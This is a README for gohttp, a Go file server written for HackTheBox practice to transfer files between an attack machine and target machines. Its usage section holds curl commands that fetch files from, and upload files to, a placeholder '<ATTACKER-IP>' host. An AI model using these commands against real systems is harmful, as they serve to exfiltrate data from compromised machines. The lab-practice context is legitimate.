# gohttp
While playing on hackthebox.com I was missing the capability to upload files from the victims machines back to my machine with Python SimpleHTTPServer.  
Therefore I wrote **gohttp** which supports both uploading and downloading files just by using the go standard library.

## Installation
### easy install
```bash
go install github.com/hebelsan/gohttp
```
### docker
```bash
TODO
```
### manual
```bash
git clone https://github.com/hebelsan/gohttp
go run main.go
```

## Usage
All the files that should be served must go into the **./static** folder.

###  Download a file from your attack device:
```bash
curl -O http://<ATTACKER-IP>/<FILENAME>
```

###  Upload a file back to your attack device:
```bash
curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
```

###  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
```bash
curl -F 'file=@<FILE1>' -F 'file=@<FILE2>' http://<ATTACKER-IP>/
```

## Configuration
Per default port 80 is used. To change it:
```bash
export PORT=4444
```